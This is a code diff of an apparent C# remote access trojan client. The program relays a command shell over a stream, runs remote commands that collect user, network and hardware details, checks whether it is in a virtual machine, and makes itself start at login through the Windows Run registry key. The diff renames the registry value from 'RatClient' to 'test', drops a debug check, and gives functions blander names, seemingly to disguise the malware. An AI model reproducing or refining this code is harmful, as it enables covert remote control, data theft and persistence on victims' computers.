@@ -153,7 +153,7 @@ namespace test
                 processCmd.StartInfo.RedirectStandardOutput = true;
                 processCmd.StartInfo.RedirectStandardInput = true;
                 processCmd.StartInfo.RedirectStandardError = true;
-                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                processCmd.OutputDataReceived += new DataReceivedEventHandler(OutputHandler);
                 processCmd.Start();
                 processCmd.BeginOutputReadLine();
             }
@@ -166,7 +166,7 @@ namespace test
                     Int16 intCommand = 0;
 
                     
-                    intCommand = GetCommandFromLine(line);
+                    intCommand = CMD(line);
 
 
                     
@@ -186,13 +186,13 @@ namespace test
                     }
 
                     strInput.Append(line);
-                    if (strInput.ToString().LastIndexOf("isdebug") >= 0) Contingency();
-                    if (strInput.ToString().LastIndexOf("userinfo") >= 0) UserID();
-                    if (strInput.ToString().LastIndexOf("testvm") >= 0) IsRunningInVirtualMachine();
+                    
+                    if (strInput.ToString().LastIndexOf("userinfo") >= 0) UserInfo();
+                    if (strInput.ToString().LastIndexOf("testvm") >= 0) DVM();
                     if (strInput.ToString().LastIndexOf("netinfo") >= 0) NetworkInfo();
                     if (strInput.ToString().LastIndexOf("setpersist") >= 0) persist();
                     if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
-                    if (strInput.ToString().IndexOf("getinfo") >= 0) GatherInfo();
+                    if (strInput.ToString().IndexOf("hwinfo") >= 0) HWInfo();
                     if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                     processCmd.StandardInput.WriteLine(strInput);
                     strInput.Remove(0, strInput.Length);
@@ -204,7 +204,7 @@ namespace test
                 }
             }
         }
-        private static void GatherInfo()
+        private static void HWInfo()
         {
             streamWriter.WriteLine("Machine Name: " + Environment.MachineName);
             streamWriter.WriteLine("OS Version: " + Environment.OSVersion);
@@ -286,7 +286,7 @@ namespace test
 
         }
 
-        private static void IsRunningInVirtualMachine()
+        private static void DVM()
         {
             var systemManufacturer = new ManagementObjectSearcher("SELECT Manufacturer FROM Win32_ComputerSystem").Get().OfType<ManagementObject>().FirstOrDefault()?["Manufacturer"]?.ToString();
             var systemModel = new ManagementObjectSearcher("SELECT Model FROM Win32_ComputerSystem").Get().OfType<ManagementObject>().FirstOrDefault()?["Model"]?.ToString();
@@ -297,7 +297,7 @@ namespace test
             streamWriter.WriteLine(videoControllerName?.ToLower().Contains("vmware") == true && videoControllerName?.ToLower().Contains("vbox") == true);
             streamWriter.Flush();
         }
-        public static void UserID()
+        public static void UserInfo()
         {
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
             streamWriter.WriteLine("User Profile Info: ");
@@ -315,7 +315,7 @@ namespace test
 
                 Microsoft.Win32.RegistryKey regKey =
                 Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-                regKey.SetValue("RatClient", Process.GetCurrentProcess().MainModule.FileName);
+                regKey.SetValue("test", Process.GetCurrentProcess().MainModule.FileName);
                 regKey.Dispose();
                 regKey.Close();
 
@@ -337,7 +337,7 @@ namespace test
             System.Environment.Exit(System.Environment.ExitCode);
         }
 
-        private static Int16 GetCommandFromLine(string strline)
+        private static Int16 CMD(string strline)
         {
             Int16 intExtractedCommand = 0;
             int i; Char character;
@@ -361,7 +361,7 @@ namespace test
             return intExtractedCommand;
         }
 
-        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        private static void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             StringBuilder strOutput = new StringBuilder();
             if (!String.IsNullOrEmpty(outLine.Data))
